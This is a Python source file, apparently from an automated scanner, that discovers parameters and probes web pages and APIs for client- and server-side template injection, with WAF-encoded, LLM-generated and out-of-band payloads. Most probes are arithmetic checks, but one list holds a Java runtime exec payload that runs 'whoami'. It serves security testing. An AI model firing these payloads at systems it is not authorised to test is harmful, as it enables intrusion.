"""CSTI discovery/payload shell.

Shell mixin; hard max 2000 LOC, prefer ~800-1500.
"""

from __future__ import annotations

import asyncio
import aiohttp
import re
from typing import Any, Dict, List, Optional, Tuple
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dataclasses import dataclass, field, asdict

from bugtrace.agents.base import BaseAgent
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.agents.mixins.tech_context import TechContextMixin
from bugtrace.core.ui import dashboard
from bugtrace.core.job_manager import JobStatus
from bugtrace.core.event_bus import EventType
from bugtrace.core.http_manager import http_manager, ConnectionProfile
from bugtrace.core.llm_client import llm_client
from bugtrace.core.config import settings
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation
from bugtrace.core.verbose_events import create_emitter
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason
from bugtrace.utils.logger import get_logger
from bugtrace.utils.parsers import XmlParser
from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data
from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy
from bugtrace.tools.waf import encoding_techniques

logger = get_logger(__name__)

from bugtrace.agents.csti.types import CSTIFinding
from bugtrace.agents.csti.payloads import (
    PAYLOAD_LIBRARY,
    HIGH_IMPACT_INDICATORS,
    MEDIUM_IMPACT_INDICATORS,
    HIGH_PRIORITY_PARAMS,
)
from bugtrace.agents.csti.fingerprinter import TemplateEngineFingerprinter

class CSTIDiscoveryMixin:
    async def _get_encoded_payloads(self, payloads: List[str]) -> List[str]:
        """Apply Q-Learning optimized encoding to payloads."""
        if not self._detected_waf:
            return payloads

        encoded = []
        for payload in payloads:
            encoded.append(payload)  # Original

            # Apply WAF-specific encodings
            variants = encoding_techniques.encode_payload(
                payload,
                waf=self._detected_waf,
                max_variants=3
            )
            encoded.extend(variants)

        return list(dict.fromkeys(encoded))  # Dedupe preserving order

    async def _targeted_probe(self, session, param, engines) -> Optional[Dict]:
        """
        Probe using payloads specific to detected engines.

        Tech-aware: Prioritizes engines detected by Nuclei in tech_profile.
        """
        # Enhance engine detection with tech_profile data
        tech_engines = []
        if self.tech_profile and self.tech_profile.get("frameworks"):
            for framework in self.tech_profile["frameworks"]:
                fw_lower = framework.lower()
                if "angular" in fw_lower:
                    tech_engines.append("angular")
                    logger.info(f"[{self.name}] Tech-aware: Prioritizing Angular CSTI (detected: {framework})")
                elif "vue" in fw_lower:
                    tech_engines.append("vue")
                    logger.info(f"[{self.name}] Tech-aware: Prioritizing Vue CSTI (detected: {framework})")

        # Merge: tech_engines first, then regular detected engines
        prioritized_engines = list(dict.fromkeys(tech_engines + engines))  # Deduplicate while preserving order

        for engine in prioritized_engines:
            payloads = PAYLOAD_LIBRARY.get(engine, [])
            payloads = await self._get_encoded_payloads(payloads)

            for p in payloads:
                dashboard.set_current_payload(p, f"CSTI:{param}", f"Targeted ({engine})")
                content, verified_url = await self._test_payload(session, param, p)
                if content:
                    finding_obj = self._create_finding(param, p, f"targeted_probe_{engine}", verified_url=verified_url)
                    return self._finding_to_dict(finding_obj)
        return None

    async def _universal_probe(self, session, param) -> Optional[Dict]:
        """Probe using universal and polyglot payloads."""
        payloads = PAYLOAD_LIBRARY.get("universal", []) + PAYLOAD_LIBRARY.get("polyglots", [])
        payloads = await self._get_encoded_payloads(payloads)
        
        for p in payloads:
            dashboard.set_current_payload(p, f"CSTI:{param}", "Universal Probe")
            content, verified_url = await self._test_payload(session, param, p)
            if content:
                finding_obj = self._create_finding(param, p, "universal_probe", verified_url=verified_url)
                return self._finding_to_dict(finding_obj)
        return None

    async def _oob_probe(self, session, param, engines) -> Optional[Dict]:
        """Probe using OOB payloads injected with Interactsh URL."""
        if not self.interactsh_url:
            return None
            
        # Get OOB payloads for detected engines + generice
        candidates = []
        for engine in engines:
            candidates.extend([p for p in PAYLOAD_LIBRARY.get(engine, []) if "{{INTERACTSH}}" in p])
        
        # Also check jinja2 generic OOB if no specific engine found
        if not candidates:
             candidates.extend([p for p in PAYLOAD_LIBRARY.get("jinja2", []) if "{{INTERACTSH}}" in p])

        for p in candidates:
            # Inject unique label
            label = f"csti_{param}"
            real_payload = p.replace("{{INTERACTSH}}", self.interactsh_url)
            
            dashboard.set_current_payload(real_payload[:20]+"...", f"CSTI:{param}", "OOB Blind")

            # Fire and forget - send OOB payload
            try:
                target_url = self._inject(param, real_payload)
                async with session.get(target_url, timeout=3):
                    pass
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass  # OOB payloads may timeout - that's expected
                
            # Check for hit
            if await self._check_oob_hit(self.interactsh_url): # Check general hit
                 finding_obj = self._create_finding(param, real_payload, "blind_oob_confirmed")
                 return self._finding_to_dict(finding_obj)
                 
        return None

    def _prioritize_params(self, params: List[Dict]) -> List[Dict]:
        """Prioritize parameters likely to be template-injectable."""
        high = []
        medium = []
        low = []

        for item in params:
            param = item.get("parameter", "").lower()

            is_high = any(hp in param or param in hp for hp in HIGH_PRIORITY_PARAMS)

            if is_high:
                high.append(item)
            elif any(x in param for x in ["id", "num", "page", "limit"]):
                low.append(item)
            else:
                medium.append(item)

        if high:
            logger.info(f"[{self.name}] 🎯 High-priority params: {[h['parameter'] for h in high]}")

        return high + medium + low

    def _get_payload_impact_tier(self, payload: str, response: str) -> int:
        """
        Determine impact tier for CSTI/SSTI.
        Returns:
            3 = RCE/File Read → STOP IMMEDIATELY
            2 = Internals Access → STOP IMMEDIATELY
            1 = Arithmetic Eval → Try 1 more
            0 = No impact → Continue
        """
        combined = (payload + " " + response).lower()

        # TIER 3: RCE or File Read
        if any(ind.lower() in combined for ind in HIGH_IMPACT_INDICATORS):
            return 3

        # TIER 2: Internals Access
        if any(ind.lower() in " ".join(MEDIUM_IMPACT_INDICATORS).lower().split() for ind in ["__globals__", "os.popen", "config"]):
             # Simplified check based on constants logic
             if "__globals__" in combined or "os.popen" in combined or "config" in combined:
                 return 2

        # TIER 1: Arithmetic Evaluation
        if "1000006000009" in response and "1000003*1000003" in payload:
            return 1

        return 0

    async def _test_single_post_payload(
        self,
        session: aiohttp.ClientSession,
        param: str,
        payload: str,
        engines: List[str]
    ) -> Optional[Dict]:
        """Test a single POST payload."""
        try:
            data = {param: payload}
            async with session.post(self.url, data=data, timeout=5) as resp:
                content = await resp.text()
                return self._check_post_injection_success(resp, content, payload, param, engines)
        except Exception as e:
            logger.debug(f"POST test failed: {e}")
            return None

    def _parse_llm_payloads(self, content: str, interactsh_url: str) -> List[Dict]:
        payloads = XmlParser.extract_list(content, "payload")
        parsed_items = []

        for p_str in payloads:
            code = XmlParser.extract_tag(p_str, "code")
            engine = XmlParser.extract_tag(p_str, "engine")

            if code:
                if "{{INTERACTSH}}" in code and interactsh_url:
                    code = code.replace("{{INTERACTSH}}", interactsh_url)

                parsed_items.append({
                    "code": code,
                    "engine": engine or "unknown"
                })

        return parsed_items

    async def _param_run_standard_probes(
        self, session: "aiohttp.ClientSession", param: str, engines: List[str]
    ) -> List[Dict]:
        """Run standard probes (targeted, universal, OOB)."""
        findings = []

        # Targeted probe
        if engines != ["unknown"]:
            finding = await self._targeted_probe(session, param, engines)
            if finding:
                findings.append(finding)
                self._record_bypass_result(finding["payload"], success=True)

        # Universal probe
        finding = await self._universal_probe(session, param)
        if finding:
            findings.append(finding)
            self._record_bypass_result(finding["payload"], success=True)

        # OOB probe
        finding = await self._oob_probe(session, param, engines)
        if finding:
            findings.append(finding)
            self._record_bypass_result(finding["payload"], success=True)

        return findings

    async def _param_run_alternative_vectors(
        self, session: "aiohttp.ClientSession", param: str, engines: List[str], param_findings: List
    ) -> List[Dict]:
        """Run alternative attack vectors (POST, headers, LLM)."""
        findings = []

        # POST injection
        finding = await self._test_post_injection(session, param, engines)
        if finding:
            findings.append(finding)

        # Header injection (rare)
        if not param_findings:
            finding = await self._test_header_injection(session, engines)
            if finding:
                findings.append(finding)

        # LLM advanced bypass (fallback)
        if self._detected_waf and not param_findings:
            finding = await self._llm_probe(session, param)
            if finding:
                findings.append(finding)

        return findings

    async def _test_parameter(self, session: "aiohttp.ClientSession", item: Dict, html: str) -> List[Dict]:
        """Test a single parameter for CSTI/SSTI vulnerabilities."""
        param = item.get("parameter")
        if not param:
            return []

        param_findings = []
        engines = TemplateEngineFingerprinter.fingerprint(html)
        
        # COST OPTIMIZATION (2026-02-01): Check reflection before LLM
        # If it's a client-side engine (Angular/Vue) and not reflected, LLM is likely a waste
        # v3.2 FIX: Skip this check for JS-rendered sites (empty HTML) - Angular renders dynamically
        is_client_side = any(e in ["angular", "vue"] for e in engines)
        is_js_rendered = len(html.strip()) < 500  # JS-rendered sites have minimal initial HTML
        if is_client_side and not is_js_rendered:
            is_reflected = await self._check_light_reflection(session, param)
            if not is_reflected:
                logger.debug(f"[{self.name}] Param '{param}' not reflected, skipping LLM for cost saving.")
                return []
        elif is_client_side and is_js_rendered:
            logger.info(f"[{self.name}] JS-rendered site detected with {engines[0]} - skipping HTTP reflection check")

        # Phase 1: LLM Smart Analysis
        if engines != ["unknown"]:
            smart_findings = await self._run_llm_smart_analysis(session, param, engines, html)
            param_findings.extend(smart_findings)

        if self._max_impact_achieved or len(param_findings) >= 2:
            return param_findings

        # Phase 2-4: Standard probes
        standard_findings = await self._param_run_standard_probes(session, param, engines)
        param_findings.extend(standard_findings)

        # Phase 5-7: Alternative vectors
        alternative_findings = await self._param_run_alternative_vectors(
            session, param, engines, param_findings
        )
        param_findings.extend(alternative_findings)

        return param_findings

    async def _prepare_scan(self):
        """Prepare for template injection scan.

        IMPROVED (2026-02-06): AUTONOMOUS SPECIALIST PATTERN v1.0
        - Discovers ALL params from URL query + HTML forms
        - Prioritizes CSTI-related params (template, message, content, subject, body)
        - Detects template engine framework (Angular, Vue, Jinja2, etc.)

        IMPROVED (2026-01-30): Auto-discover params from URL and HTML.
        FIXED (2026-02-01): URL query params are FIRST-CLASS citizens (before provided params).
        """
        # AUTONOMOUS DISCOVERY: Fetch HTML and extract ALL testable params
        try:
            discovered_params_dict = await self._discover_csti_params(self.url)

            # Convert to list format and prioritize CSTI-related params
            discovered_params = self._prioritize_csti_params(discovered_params_dict)

        except Exception as e:
            logger.error(f"[{self.name}] Autonomous discovery failed: {e}, falling back to old method")
            # Fallback to old sync method if async discovery fails
            discovered_params = self._discover_all_params()

        # FIXED: URL query params come FIRST, then merge with provided params
        discovered_names = {p.get("parameter") for p in discovered_params}

        # Add provided params that aren't already discovered
        for p in self.params:
            if p.get("parameter") not in discovered_names:
                discovered_params.append(p)

        # CSTI-specific prioritization already applied in _prioritize_csti_params()
        # No need for double prioritization - the autonomous method already orders params
        self.params = discovered_params

        # Log what we're testing
        param_names = [p.get("parameter") for p in self.params]
        logger.info(f"[{self.name}] 🎯 Parameters to test (CSTI-prioritized): {param_names}")
        dashboard.log(f"[{self.name}] Testing {len(self.params)} params: {param_names[:5]}{'...' if len(param_names) > 5 else ''}", "INFO")

        await self._detect_waf_async()
        await self._setup_interactsh()

    async def _discover_csti_params(self, url: str) -> Dict[str, str]:
        """
        CSTI-focused parameter discovery (AUTONOMOUS SPECIALIST PATTERN v1.0).

        Extracts ALL testable parameters from:
        1. URL query string
        2. HTML forms (input, textarea, select) - template content
        3. Prioritizes CSTI-related param names (template, message, content, subject, body)

        Returns:
            Dict mapping param names to default values
            Example: {"category": "Juice", "template": "", "message": ""}

        Architecture Note:
            Specialists must be AUTONOMOUS - they discover their own attack surface.
            The finding from DASTySAST is just a "signal" that the URL is interesting.
            We IGNORE the specific parameter and test ALL discoverable params.

        Ref: .ai-context/SPECIALIST_AUTONOMY_PATTERN.md
        """
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, parse_qs
        from bs4 import BeautifulSoup

        all_params = {}

        # 1. Extract URL query parameters
        try:
            parsed = urlparse(url)
            url_params = parse_qs(parsed.query)
            for param_name, values in url_params.items():
                all_params[param_name] = values[0] if values else ""
        except Exception as e:
            logger.warning(f"[{self.name}] Failed to parse URL params: {e}")

        # 2. Fetch HTML and extract form parameters
        try:
            state = await browser_manager.capture_state(url)
            html = state.get("html", "")

            if html:
                soup = BeautifulSoup(html, "html.parser")

                # Extract from <input>, <textarea>, <select> with name attribute
                for tag in soup.find_all(["input", "textarea", "select"]):
                    param_name = tag.get("name")
                    if param_name and param_name not in all_params:
                        # Exclude CSRF tokens and submit buttons
                        input_type = tag.get("type", "text").lower()
                        if input_type not in ["submit", "button", "reset"]:
                            if "csrf" not in param_name.lower() and "token" not in param_name.lower():
                                # Get default value
                                default_value = tag.get("value", "")
                                all_params[param_name] = default_value

                # 3. Extract params from <a> href links (same-origin only)
                parsed_base = urlparse(url)
                for a_tag in soup.find_all("a", href=True):
                    href = a_tag["href"]
                    if href.startswith(("javascript:", "mailto:", "#", "tel:")):
                        continue
                    try:
                        from urllib.parse import urljoin
                        resolved = urljoin(url, href)
                        parsed_href = urlparse(resolved)
                        if parsed_href.netloc and parsed_href.netloc != parsed_base.netloc:
                            continue
                        href_params = parse_qs(parsed_href.query)
                        for p_name, p_vals in href_params.items():
                            if p_name not in all_params and "csrf" not in p_name.lower() and "token" not in p_name.lower():
                                all_params[p_name] = p_vals[0] if p_vals else ""
                    except Exception:
                        continue

                # 4. CSTI-specific: Detect template engine in use
                detected_engines = TemplateEngineFingerprinter.fingerprint(html)
                if detected_engines and detected_engines[0] != "unknown":
                    logger.info(f"[{self.name}] 🔍 Detected template engine(s): {', '.join(detected_engines)}")

        except Exception as e:
            logger.error(f"[{self.name}] HTML parsing failed: {e}")

        logger.info(f"[{self.name}] 🔍 Discovered {len(all_params)} params on {url}: {list(all_params.keys())}")
        return all_params

    def _prioritize_csti_params(self, all_params: Dict[str, str]) -> List[Dict]:
        """
        Prioritize CSTI-related parameter names.

        High Priority: template, message, content, subject, body, text, comment, description
        Medium Priority: search, q, query, name, title
        Low Priority: all others
        """
        CSTI_HIGH_PRIORITY = ["template", "message", "content", "subject", "body", "text", "comment", "description", "email_body", "sms_body"]
        CSTI_MEDIUM_PRIORITY = ["search", "q", "query", "name", "title", "view", "page", "lang", "theme"]

        prioritized = []

        # 1. High priority params first
        for param_name in CSTI_HIGH_PRIORITY:
            if param_name in all_params:
                prioritized.append({"parameter": param_name, "source": "html_form_high_priority"})

        # 2. Medium priority params
        for param_name in CSTI_MEDIUM_PRIORITY:
            if param_name in all_params and param_name not in [p["parameter"] for p in prioritized]:
                prioritized.append({"parameter": param_name, "source": "html_form_medium_priority"})

        # 3. All other discovered params
        for param_name in all_params.keys():
            if param_name not in [p["parameter"] for p in prioritized]:
                prioritized.append({"parameter": param_name, "source": "html_form_discovered"})

        logger.info(f"[{self.name}] 🎯 Prioritized {len(prioritized)} params for CSTI testing")
        return prioritized

    def _discover_all_params(self) -> List[Dict]:
        """
        DEPRECATED (2026-02-06): Use _discover_csti_params() instead (async).

        This method is kept for backwards compatibility but should be replaced
        with the async autonomous discovery pattern.

        ADDED (2026-01-30): Auto-discover ALL testable parameters.
        IMPROVED (2026-02-01): URL query params are first-class citizens (no path filtering).

        Sources:
        1. URL query string params (ALWAYS - first-class)
        2. Common vulnerable param names (ALWAYS - for comprehensive coverage)
        """
        discovered = []

        # 1. Extract from URL query string (ALWAYS - first-class citizens)
        parsed = urlparse(self.url)
        query_params = parse_qs(parsed.query)
        for param_name in query_params.keys():
            discovered.append({"parameter": param_name, "source": "url_query"})
            logger.info(f"[{self.name}] 🎯 URL Query Param (first-class): {param_name}")

        # 2. ALWAYS add common vulnerable params for comprehensive coverage
        # FIXED (2026-02-01): Removed path filtering - Burp tests these on ALL endpoints
        common_vuln_params = ["category", "search", "q", "query", "filter", "sort",
                              "template", "view", "page", "lang", "theme", "type", "action"]
        for param in common_vuln_params:
            if param not in query_params:
                discovered.append({"parameter": param, "source": "common_vuln"})
                logger.debug(f"[{self.name}] Added common vuln param: {param}")

        return discovered

    async def _scan_all_parameters(self) -> List[Dict]:
        """Scan all parameters for template injection."""
        all_findings = []
        # Use HTTPClientManager for proper connection management (v2.4)
        async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
            html = await self._fetch_page(session)
            all_findings = await self._test_all_params(session, html)
        return all_findings

    async def _test_all_params(self, session, html: str) -> List[Dict]:
        """Test all parameters with session and HTML (Parallel Mode)."""
        all_findings = []
        
        # Parallel optimization: Process up to 5 parameters concurrently
        semaphore = asyncio.Semaphore(5)
        
        async def _worker(item):
            async with semaphore:
                if self._max_impact_achieved:
                    return []
                return await self._test_parameter(session, item, html)

        tasks = [_worker(item) for item in self.params]
        results = await asyncio.gather(*tasks)
        
        for r in results:
            all_findings.extend(r)
            
        return all_findings

    async def _test_payload(self, session, param, payload) -> Tuple[Optional[str], Optional[str]]:
        """
        Injects payload and performs 4-level validation.
        Returns (content, effective_url) if validated (L1-L3).
        Returns (None, None) if validation fails.

        v3.2.2: Changed to only return content when ACTUALLY validated.
        Escalation to L4 is now handled separately by the caller.
        """
        target_url = self._inject(param, payload)

        # Level 1-2 Check (HTTP)
        try:
            async with session.get(target_url, timeout=5) as resp:
                content = await resp.text()
                final_url = str(resp.url)

                logger.debug(f"[{self.name}] CSTI test: response {len(content)} chars for {payload[:30]}")

                validated, evidence = await self._validate(param, payload, content, Path(settings.LOG_DIR))
                if validated:
                    # L1-L3 confirmed it
                    logger.info(f"[{self.name}] CSTI VALIDATED: {payload[:50]} via {evidence.get('method', 'unknown')}")
                    return content, final_url

                # v3.2.2: Don't return content for escalation - only return when truly validated
                # The L4 escalation should be handled by a separate mechanism (AgenticValidator)
                logger.debug(f"[{self.name}] CSTI L1-L3 failed for {payload[:30]}")

        except Exception as e:
            logger.debug(f"CSTI test error: {e}")

        return None, None

    async def _llm_probe(self, session: aiohttp.ClientSession, param: str) -> Optional[Dict]:
        """Use LLM to generate custom bypasses or target specific engines."""
        self.think(f"Generating advanced bypasses for parameter '{param}'")
        
        user_prompt = f"Target URL: {self.url}\nParameter: {param}\n\nGenerate 5 advanced CSTI/SSTI bypasses for modern engines (Angular, Vue, Jinja2, Mako)."
        
        try:
            response = await llm_client.generate(user_prompt, system_prompt=self.system_prompt, module_name="CSTI_AGENT")
            ai_payloads = XmlParser.extract_list(response, "payload")
            
            # Enrich with WAF bypass
            ai_payloads = await self._get_encoded_payloads(ai_payloads)

            for ap in ai_payloads:
                dashboard.set_current_payload(ap, f"CSTI:{param}", "AI Advanced")
                content, verified_url = await self._test_payload(session, param, ap)
                if content:
                    return self._create_finding(param, ap, "ai_bypass", verified_url=verified_url)
        except Exception as e:
            logger.error(f"CSTI LLM check failed: {e}", exc_info=True)
            
        return None

    def _detect_engine_from_payload(self, payload: str) -> str:
        """Detecta el motor de plantillas basándose en la sintaxis."""
        if '{{' in payload and '}}' in payload:
            return self._detect_curly_brace_engine(payload)
        if '${' in payload:
            return 'freemarker'
        if '#set' in payload or '$!' in payload:
            return 'velocity'
        if '{%' in payload:
            return 'jinja2'
        return 'unknown'

    def _try_universal_payloads(self, tried_variants: List[str]) -> Optional[str]:
        """Try universal CSTI payloads."""
        universal_csti = [
            "{{1000003*1000003}}", "${1000003*1000003}", "#{1000003*1000003}", "<%= 1000003*1000003 %>", "{{= 1000003*1000003 }}",
            "${{1000003*1000003}}", "{{7*'7'}}", "{{config}}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}"
        ]

        for variant in universal_csti:
            if variant not in tried_variants:
                logger.info(f"[CSTIAgent] Generated universal variant: {variant[:80]}...")
                return variant
        return None

    def _fallback_fingerprint_dedup(self, wet_findings: List[Dict]) -> List[Dict]:
        """
        Fallback fingerprint-based deduplication if LLM fails.
        Uses _generate_csti_fingerprint for expert dedup.
        """
        seen = set()
        dry_list = []

        for finding in wet_findings:
            url = finding.get("url", "")
            parameter = finding.get("parameter", "")
            template_engine = finding.get("template_engine", "unknown")

            fingerprint = self._generate_csti_fingerprint(url, parameter, template_engine)

            if fingerprint not in seen:
                seen.add(fingerprint)
                dry_list.append(finding)

        logger.info(f"[{self.name}] Fingerprint dedup: {len(wet_findings)} → {len(dry_list)}")
        return dry_list

    async def _send_csti_payload_raw(self, session, param: str, payload: str) -> Tuple[Optional[str], Optional[str]]:
        """Fire a CSTI payload and return raw HTTP response. No validation."""
        target_url = self._inject(param, payload)
        try:
            async with session.get(target_url, timeout=8) as resp:
                content = await resp.text()
                # A 4xx means the endpoint/param is NOT a real reflection sink. A coincidental
                # "1000006000009" in a 404/403 body (e.g. paths like /M/d/yy or /resources/js/text/ng-template
                # that param-discovery picked up from AngularJS source-string literals) must NEVER
                # confirm CSTI — that is a pure false positive. 5xx is left flowing so error-signature
                # SSTI (template exception classes that surface on 500s) still works.
                if 400 <= resp.status < 500:
                    logger.debug(
                        f"[{self.name}] Dropping {resp.status} response (not a reflection sink): {target_url}"
                    )
                    return None, None
                return content, str(resp.url)
        except Exception as e:
            logger.debug(f"[{self.name}] Send payload failed: {e}")
            return None, None

    async def _test_api_ssti(self, url: str, parameter: str, finding: dict) -> Optional[CSTIFinding]:
        """
        Test API endpoints for Server-Side Template Injection (SSTI).

        API endpoints need POST with JSON body + auth headers (unlike HTML pages
        which use GET with query params). Tests common SSTI payloads against
        template-rendering API endpoints (e.g. email preview, report generation).
        """
        import aiohttp
        from bugtrace.core.http_manager import http_manager, ConnectionProfile

        # Resolve mismatched URLs (e.g. param="email-preview" on url="/api/debug/vulns")
        url = self._resolve_api_ssti_url(url, parameter)

        # Get cookies/headers from agent
        auth_headers = getattr(self, 'headers', {})
        
        logger.info(f"[{self.name}] API SSTI test: {url} param={parameter}")

        # Common body parameter names for template content
        body_params = [parameter] if parameter else []
        for p in ['body', 'content', 'template', 'message', 'text', 'subject', 'description']:
            if p not in body_params:
                body_params.append(p)

        # SSTI payloads (Jinja2 focus — most common server-side engine)
        ssti_payloads = [
            ("{{1000003*1000003}}", "1000006000009", "jinja2"),
            ("{{7*'7'}}", "7777777", "jinja2"),
            ("${1000003*1000003}", "1000006000009", "freemarker"),
            ("<%= 1000003*1000003 %>", "1000006000009", "erb"),
            ("#{1000003*1000003}", "1000006000009", "ruby"),
        ]

        # Get baseline (no injection) for false positive check
        baseline_text = ""
        try:
            async with aiohttp.ClientSession() as session:
                headers = {**auth_headers, "Content-Type": "application/json"}
                # Try GET baseline first
                async with session.get(url, headers=auth_headers, timeout=aiohttp.ClientTimeout(total=8), ssl=False) as resp:
                    baseline_text = await resp.text()
        except Exception:
            pass

        # Phase 1: Discover which body params the endpoint accepts
        # Try POST with each payload on each body param
        for template_payload, expected_result, engine_name in ssti_payloads:
            for body_param in body_params[:5]:  # Cap at 5 params
                # Build JSON body — include required fields for common patterns
                json_body = {body_param: template_payload}
                # Common required companion fields
                if body_param == 'body':
                    json_body['subject'] = 'Test'
                elif body_param == 'content':
                    json_body['title'] = 'Test'

                try:
                    async with aiohttp.ClientSession() as session:
                        headers = {**auth_headers, "Content-Type": "application/json"}
                        async with session.post(
                            url, json=json_body, headers=headers,
                            timeout=aiohttp.ClientTimeout(total=10), ssl=False
                        ) as resp:
                            status = resp.status
                            response_text = await resp.text()

                            if status in (401, 403):
                                # Need auth or current token is invalid — try waiting for (better) JWT
                                fresh_headers = await self._wait_for_api_ssti_auth()
                                if fresh_headers:
                                    auth_headers = fresh_headers
                                    self._auth_headers = fresh_headers
                                    # Retry with (fresh) auth
                                    retry_headers = {**auth_headers, "Content-Type": "application/json"}
                                    async with session.post(
                                        url, json=json_body, headers=retry_headers,
                                        timeout=aiohttp.ClientTimeout(total=10), ssl=False
                                    ) as retry_resp:
                                        status = retry_resp.status
                                        response_text = await retry_resp.text()

                            if status >= 400:
                                continue

                            # Check for template evaluation
                            if expected_result in response_text and expected_result not in baseline_text:
                                # Verify it's not just reflection
                                if template_payload not in response_text or "1000003*1000003" not in response_text:
                                    logger.info(f"[{self.name}] 🚨 API SSTI CONFIRMED: {url} param={body_param} engine={engine_name}")
                                    finding = self._create_finding(body_param, template_payload, "API_POST_SSTI", verified_url=url)
                                    finding.template_engine = engine_name
                                    finding.engine_type = "server-side"
                                    finding.evidence = {
                                        "method": "api_post_ssti",
                                        "proof": f"POST {body_param}={template_payload} → response contains '{expected_result}'",
                                        "status": "VALIDATED_CONFIRMED",
                                        "level": "API_SSTI",
                                        "engine": engine_name,
                                        "http_method": "POST",
                                        "body_param": body_param,
                                    }
                                    finding.successful_payloads = [template_payload]
                                    return finding

                except aiohttp.ClientError:
                    continue
                except Exception as e:
                    logger.debug(f"[{self.name}] API SSTI test error: {e}")
                    continue

        return None

    def _generate_csti_fingerprint(self, url: str, parameter: str, template_engine: str) -> tuple:
        """
        Generate CSTI finding fingerprint for expert deduplication.

        Client-side engines (angular, vue) share a page-level scope,
        so multiple params on the same page = one vulnerability.
        Server-side engines are param-specific.

        Returns:
            Tuple fingerprint for deduplication
        """
        from urllib.parse import urlparse

        parsed = urlparse(url)
        normalized_path = parsed.path.rstrip('/')

        client_side_engines = {"angular", "vue", "knockout", "ember", "react"}
        is_client_side = template_engine.lower() in client_side_engines

        if is_client_side:
            # Same page + same engine = same Angular/Vue scope = one finding
            fingerprint = ("CSTI", parsed.netloc, normalized_path, template_engine)
        else:
            # Server-side: each parameter is a separate injection point
            fingerprint = ("CSTI", parsed.netloc, normalized_path, parameter.lower(), template_engine)

        return fingerprint

